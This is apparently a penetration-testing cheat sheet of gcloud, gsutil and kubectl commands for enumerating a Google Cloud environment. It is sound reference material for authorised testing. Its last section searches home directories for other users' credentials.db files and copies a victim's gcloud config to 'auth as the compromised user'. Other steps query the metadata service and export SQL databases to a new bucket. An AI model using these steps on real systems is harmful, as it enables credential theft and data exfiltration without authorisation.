# __ACCOUNT INFORMATION__
## User Identity Login
```gcloud auth login```
## Service Account Login
```gcloud auth activate-service-account --key-file creds.json```
## List Accounts Available to gcloud
```gcloud auth list```
## List Organizations
```gcloud organizations list```
## Enumerate IAM Policies set ORG-Wide
```gcloud organizations get-iam-policy <org ID>```
## Enumerate IAM Policies set per project
```gcloud projects get-iam-policy <project ID>```
## List Projects
```gcloud projects list```
## Change or Set a different project
```gcloud config set project <project name>```
## Gives a list of all APIs that are enabled in a project
```gcloud services list```
## Get source code repos available to user
```gcloud source repos list```
## Clone repo to home dir
```gcloud source repos clone <repo_name>```

**# VIRTUAL MACHINES**
---
## List compute instances
```gcloud compute instances list```
## Give Shell Access to instance
```gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"```
## Puts public ssh key onto metadata service for project
```gcloud compute ssh <local host>```
## Get access scopes if on an instance
```curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google’``````
## Use Google keyring to decrypt encrypted data
```gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global```

**#STORAGE**
---
## List Google Storage buckets
```gsutil ls```

## List Google Storage buckets recursively
```gsutil ls -r gs://<bucket name>```

## Copy item from bucket
```gsutil cp gs://bucketid/item ~/```



# WEBAPPS AND SQL
---
## List WebApps
```gcloud app instances list```

## List SQL instances
```gcloud sql instances list```
```gcloud spanner instances list```
```gcloud bigtable instances list```

## List SQL databases
gcloud sql databases list --instance <instance ID>
gcloud spanner databases list --instance <instance name>

## Export SQL databases and buckets
First copy buckets to local directory
```gsutil cp gs://bucket-name/folder/ .```

## Create a new storage bucket, change perms, export SQL DB
```gsutil mb gs://<googlestoragename>```
```gsutil acl ch -u <service account> gs://<googlestoragename>```
```gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>```



# NETWORKING
---
## List networks
```gcloud compute networks list```

## List subnets
```gcloud compute networks subnets list```

## List VPN tunnels
```gcloud compute vpn-tunnels list```

## List Interconnects (VPN)
```gcloud compute interconnects list```



# CONTAINERS
---
## List existing containers in cluster
gcloud container clusters list

## To get GCP Kubernetes config file ~/.kube/config gets generated when you are authenticated with gcloud and run
```gcloud container clusters get-credentials <cluster name> --region <region>```
## If successful and the user has the correct permission the Kubernetes command below can be used to get cluster info
```kubectl cluster-info```



# SERVERLESS
---
## GCP functions log analysis – May get useful information from logs associated with GCP functions
```gcloud functions list```
```gcloud functions describe <function name>```
```gcloud functions logs read <function name> --limit <number of lines>```

## GCP Cloud Run analysis – May get useful information from descriptions such as environment variables.
```gcloud run services list```
```gcloud run services describe <service-name>```
```gcloud run revisions describe --region=<region> <revision-name>```

## Gcloud stores creds in ~/.config/gcloud/credentials.db Search home directories
```sudo find /home -name "credentials.db```

## Copy gcloud dir to your own home directory to auth as the compromised user
```sudo cp -r /home/username/.config/gcloud ~/.config```
```sudo chown -R currentuser:currentuser ~/.config/gcloud```
```gcloud auth list```

## Metadata Service URL
```curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"```
